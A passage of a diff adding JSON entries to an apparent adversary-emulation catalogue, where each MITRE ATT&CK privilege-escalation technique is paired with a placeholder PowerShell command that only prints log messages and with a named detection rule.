+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1078.001-Default Accounts",
+      "name": "Excalibur - Privilege Escalation-T1078.001-Default Accounts",
+      "description": "Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1078.001",
+      "technique_name": "Default Accounts",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1078.001 - Default Accounts'; Write-Host '[INFO] Emulating T1078.001 (Default Accounts) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1078.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1078.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Default Accounts (T1078.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.003-Time Providers",
+      "name": "Excalibur - Privilege Escalation-T1547.003-Time Providers",
+      "description": "Adversaries may abuse time providers to execute DLLs when the system boots.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.003",
+      "technique_name": "Time Providers",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.003 - Time Providers'; Write-Host '[INFO] Emulating T1547.003 (Time Providers) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Time Providers (T1547.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1134.002-Create Process with Token",
+      "name": "Excalibur - Privilege Escalation-T1134.002-Create Process with Token",
+      "description": "Adversaries may create a new process with an existing token to escalate privileges and bypass access controls.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1134.002",
+      "technique_name": "Create Process with Token",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1134.002 - Create Process with Token'; Write-Host '[INFO] Emulating T1134.002 (Create Process with Token) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1134.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1134.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Create Process with Token (T1134.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.004-Winlogon Helper DLL",
+      "name": "Excalibur - Privilege Escalation-T1547.004-Winlogon Helper DLL",
+      "description": "Adversaries may abuse features of Winlogon to execute DLLs and/or executables when a user logs in.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.004",
+      "technique_name": "Winlogon Helper DLL",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.004 - Winlogon Helper DLL'; Write-Host '[INFO] Emulating T1547.004 (Winlogon Helper DLL) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.004 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.004 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Winlogon Helper DLL (T1547.004)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.012-Image File Execution Options Injection",
+      "name": "Excalibur - Privilege Escalation-T1546.012-Image File Execution Options Injection",
+      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by Image File Execution Options (IFEO) debuggers.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.012",
+      "technique_name": "Image File Execution Options Injection",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.012 - Image File Execution Options Injection'; Write-Host '[INFO] Emulating T1546.012 (Image File Execution Options Injection) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.012 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.012 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Image File Execution Options Injection (T1546.012)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.013-Process Doppelgänging",
+      "name": "Excalibur - Privilege Escalation-T1055.013-Process Doppelgänging",
+      "description": "Adversaries may inject malicious code into process via process doppelgänging in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.013",
+      "technique_name": "Process Doppelgänging",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.013 - Process Doppelgänging'; Write-Host '[INFO] Emulating T1055.013 (Process Doppelgänging) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.013 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.013 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Process Doppelgänging (T1055.013)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.008-Accessibility Features",
+      "name": "Excalibur - Privilege Escalation-T1546.008-Accessibility Features",
+      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.008",
+      "technique_name": "Accessibility Features",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.008 - Accessibility Features'; Write-Host '[INFO] Emulating T1546.008 (Accessibility Features) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.008 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.008 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Accessibility Features (T1546.008)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.004-Asynchronous Procedure Call",
+      "name": "Excalibur - Privilege Escalation-T1055.004-Asynchronous Procedure Call",
+      "description": "Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.004",
+      "technique_name": "Asynchronous Procedure Call",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.004 - Asynchronous Procedure Call'; Write-Host '[INFO] Emulating T1055.004 (Asynchronous Procedure Call) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.004 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.004 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Asynchronous Procedure Call (T1055.004)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.009-AppCert DLLs",
+      "name": "Excalibur - Privilege Escalation-T1546.009-AppCert DLLs",
+      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppCert DLLs loaded into processes.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.009",
+      "technique_name": "AppCert DLLs",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.009 - AppCert DLLs'; Write-Host '[INFO] Emulating T1546.009 (AppCert DLLs) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.009 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.009 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect AppCert DLLs (T1546.009)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1098.005-Device Registration",
+      "name": "Excalibur - Privilege Escalation-T1098.005-Device Registration",
+      "description": "Adversaries may register a device to an adversary-controlled account.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1098.005",
+      "technique_name": "Device Registration",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1098.005 - Device Registration'; Write-Host '[INFO] Emulating T1098.005 (Device Registration) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1098.005 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1098.005 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Device Registration (T1098.005)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.002-Portable Executable Injection",
+      "name": "Excalibur - Privilege Escalation-T1055.002-Portable Executable Injection",
+      "description": "Adversaries may inject portable executables (PE) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.002",
+      "technique_name": "Portable Executable Injection",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.002 - Portable Executable Injection'; Write-Host '[INFO] Emulating T1055.002 (Portable Executable Injection) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Portable Executable Injection (T1055.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1134.001-Token Impersonation/Theft",
+      "name": "Excalibur - Privilege Escalation-T1134.001-Token Impersonation/Theft",
+      "description": "Adversaries may duplicate then impersonate another user's existing token to escalate privileges and bypass access controls.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1134.001",
+      "technique_name": "Token Impersonation/Theft",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1134.001 - Token Impersonation/Theft'; Write-Host '[INFO] Emulating T1134.001 (Token Impersonation/Theft) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1134.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1134.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Token Impersonation/Theft (T1134.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1134.003-Make and Impersonate Token",
+      "name": "Excalibur - Privilege Escalation-T1134.003-Make and Impersonate Token",
+      "description": "Adversaries may make new tokens and impersonate users to escalate privileges and bypass access controls.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1134.003",
+      "technique_name": "Make and Impersonate Token",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1134.003 - Make and Impersonate Token'; Write-Host '[INFO] Emulating T1134.003 (Make and Impersonate Token) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1134.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1134.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Make and Impersonate Token (T1134.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.003-Windows Management Instrumentation Event Subscription",
+      "name": "Excalibur - Privilege Escalation-T1546.003-Windows Management Instrumentation Event Subscription",
+      "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.003",
+      "technique_name": "Windows Management Instrumentation Event Subscription",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.003 - Windows Management Instrumentation Event Subscription'; Write-Host '[INFO] Emulating T1546.003 (Windows Management Instrumentation Event Subscription) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Windows Management Instrumentation Event Subscription (T1546.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1134.004-Parent PID Spoofing",
+      "name": "Excalibur - Privilege Escalation-T1134.004-Parent PID Spoofing",
+      "description": "Adversaries may spoof the parent process identifier (PPID) of a new process to evade process-monitoring defenses or to elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1134.004",
+      "technique_name": "Parent PID Spoofing",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1134.004 - Parent PID Spoofing'; Write-Host '[INFO] Emulating T1134.004 (Parent PID Spoofing) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1134.004 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1134.004 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Parent PID Spoofing (T1134.004)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.001-Change Default File Association",
+      "name": "Excalibur - Privilege Escalation-T1546.001-Change Default File Association",
+      "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.001",
+      "technique_name": "Change Default File Association",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.001 - Change Default File Association'; Write-Host '[INFO] Emulating T1546.001 (Change Default File Association) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Change Default File Association (T1546.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.001-Registry Run Keys / Startup Folder",
+      "name": "Excalibur - Privilege Escalation-T1547.001-Registry Run Keys / Startup Folder",
+      "description": "Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.001",
+      "technique_name": "Registry Run Keys / Startup Folder",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.001 - Registry Run Keys / Startup Folder'; Write-Host '[INFO] Emulating T1547.001 (Registry Run Keys / Startup Folder) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Registry Run Keys / Startup Folder (T1547.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.012-Process Hollowing",
+      "name": "Excalibur - Privilege Escalation-T1055.012-Process Hollowing",
+      "description": "Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.012",
+      "technique_name": "Process Hollowing",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.012 - Process Hollowing'; Write-Host '[INFO] Emulating T1055.012 (Process Hollowing) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.012 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.012 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Process Hollowing (T1055.012)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1134.005-SID-History Injection",
+      "name": "Excalibur - Privilege Escalation-T1134.005-SID-History Injection",
+      "description": "Adversaries may use SID-History Injection to escalate privileges and bypass access controls.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1134.005",
+      "technique_name": "SID-History Injection",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1134.005 - SID-History Injection'; Write-Host '[INFO] Emulating T1134.005 (SID-History Injection) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1134.005 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1134.005 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect SID-History Injection (T1134.005)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.002-Authentication Package",
+      "name": "Excalibur - Privilege Escalation-T1547.002-Authentication Package",
+      "description": "Adversaries may abuse authentication packages to execute DLLs when the system boots.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.002",
+      "technique_name": "Authentication Package",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.002 - Authentication Package'; Write-Host '[INFO] Emulating T1547.002 (Authentication Package) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Authentication Package (T1547.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.015-Component Object Model Hijacking",
+      "name": "Excalibur - Privilege Escalation-T1546.015-Component Object Model Hijacking",
+      "description": "Adversaries may establish persistence by executing malicious content triggered by hijacked references to Component Object Model (COM) objects.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.015",
+      "technique_name": "Component Object Model Hijacking",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.015 - Component Object Model Hijacking'; Write-Host '[INFO] Emulating T1546.015 (Component Object Model Hijacking) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.015 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.015 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Component Object Model Hijacking (T1546.015)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1078.002-Domain Accounts",
+      "name": "Excalibur - Privilege Escalation-T1078.002-Domain Accounts",
+      "description": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1078.002",
+      "technique_name": "Domain Accounts",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1078.002 - Domain Accounts'; Write-Host '[INFO] Emulating T1078.002 (Domain Accounts) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1078.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1078.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Domain Accounts (T1078.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.018-Python Startup Hooks",
+      "name": "Excalibur - Privilege Escalation-T1546.018-Python Startup Hooks",
+      "description": "Adversaries may achieve persistence by leveraging Python’s startup mechanisms, including path configuration (`.pth`) files and the `sitecustomize.py` or `usercustomize.py` modules.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.018",
+      "technique_name": "Python Startup Hooks",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.018 - Python Startup Hooks'; Write-Host '[INFO] Emulating T1546.018 (Python Startup Hooks) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.018 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.018 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Python Startup Hooks (T1546.018)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1037.003-Network Logon Script",
+      "name": "Excalibur - Privilege Escalation-T1037.003-Network Logon Script",
+      "description": "Adversaries may use network logon scripts automatically executed at logon initialization to establish persistence.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1037.003",
+      "technique_name": "Network Logon Script",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1037.003 - Network Logon Script'; Write-Host '[INFO] Emulating T1037.003 (Network Logon Script) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1037.003 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1037.003 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Network Logon Script (T1037.003)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.010-AppInit DLLs",
+      "name": "Excalibur - Privilege Escalation-T1546.010-AppInit DLLs",
+      "description": "Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by AppInit DLLs loaded into processes.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.010",
+      "technique_name": "AppInit DLLs",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.010 - AppInit DLLs'; Write-Host '[INFO] Emulating T1546.010 (AppInit DLLs) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.010 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.010 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect AppInit DLLs (T1546.010)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.002-Screensaver",
+      "name": "Excalibur - Privilege Escalation-T1546.002-Screensaver",
+      "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.002",
+      "technique_name": "Screensaver",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.002 - Screensaver'; Write-Host '[INFO] Emulating T1546.002 (Screensaver) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Screensaver (T1546.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1546.016-Installer Packages",
+      "name": "Excalibur - Privilege Escalation-T1546.016-Installer Packages",
+      "description": "Adversaries may establish persistence and elevate privileges by using an installer to trigger the execution of malicious content.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1546.016",
+      "technique_name": "Installer Packages",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1546.016 - Installer Packages'; Write-Host '[INFO] Emulating T1546.016 (Installer Packages) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1546.016 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1546.016 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Installer Packages (T1546.016)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.005-Thread Local Storage",
+      "name": "Excalibur - Privilege Escalation-T1055.005-Thread Local Storage",
+      "description": "Adversaries may inject malicious code into processes via thread local storage (TLS) callbacks in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.005",
+      "technique_name": "Thread Local Storage",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.005 - Thread Local Storage'; Write-Host '[INFO] Emulating T1055.005 (Thread Local Storage) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.005 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.005 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Thread Local Storage (T1055.005)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1098.002-Additional Email Delegate Permissions",
+      "name": "Excalibur - Privilege Escalation-T1098.002-Additional Email Delegate Permissions",
+      "description": "Adversaries may grant additional permission levels to maintain persistent access to an adversary-controlled email account.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1098.002",
+      "technique_name": "Additional Email Delegate Permissions",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1098.002 - Additional Email Delegate Permissions'; Write-Host '[INFO] Emulating T1098.002 (Additional Email Delegate Permissions) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1098.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1098.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Additional Email Delegate Permissions (T1098.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1037.001-Logon Script (Windows)",
+      "name": "Excalibur - Privilege Escalation-T1037.001-Logon Script (Windows)",
+      "description": "Adversaries may use Windows logon scripts automatically executed at logon initialization to establish persistence.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1037.001",
+      "technique_name": "Logon Script (Windows)",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1037.001 - Logon Script (Windows)'; Write-Host '[INFO] Emulating T1037.001 (Logon Script (Windows)) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1037.001 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1037.001 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect Logon Script (Windows) (T1037.001)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.015-ListPlanting",
+      "name": "Excalibur - Privilege Escalation-T1055.015-ListPlanting",
+      "description": "Adversaries may abuse list-view controls to inject malicious code into hijacked processes in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.015",
+      "technique_name": "ListPlanting",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1055.015 - ListPlanting'; Write-Host '[INFO] Emulating T1055.015 (ListPlanting) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1055.015 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1055.015 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect ListPlanting (T1055.015)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1547.008-LSASS Driver",
+      "name": "Excalibur - Privilege Escalation-T1547.008-LSASS Driver",
+      "description": "Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1547.008",
+      "technique_name": "LSASS Driver",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1547.008 - LSASS Driver'; Write-Host '[INFO] Emulating T1547.008 (LSASS Driver) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1547.008 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1547.008 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect LSASS Driver (T1547.008)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1053.002-At",
+      "name": "Excalibur - Privilege Escalation-T1053.002-At",
+      "description": "Adversaries may abuse the at utility to perform task scheduling for initial or recurring execution of malicious code.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1053.002",
+      "technique_name": "At",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
+      "command": "Write-Host '[START] T1053.002 - At'; Write-Host '[INFO] Emulating T1053.002 (At) tactic=Privilege Escalation platform=windows'; Write-Host '[SUCCESS] T1053.002 emulation event logged'",
+      "cleanup_command": "Write-Host '[INFO] T1053.002 cleanup: no persistent artefacts'",
+      "detection_rule": "Detect At (T1053.002)",
+      "sentinel_connector": "Microsoft Defender for Endpoint",
+      "package": "excalibur"
+    },
+    {
+      "id": "Excalibur - Privilege Escalation-T1055.001-Dynamic-link Library Injection",
+      "name": "Excalibur - Privilege Escalation-T1055.001-Dynamic-link Library Injection",
+      "description": "Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges.",
+      "tactic": "Privilege Escalation",
+      "tcode": "T1055.001",
+      "technique_name": "Dynamic-link Library Injection",
+      "executor": "powershell",
+      "platform": "windows",
+      "required_tags": [],
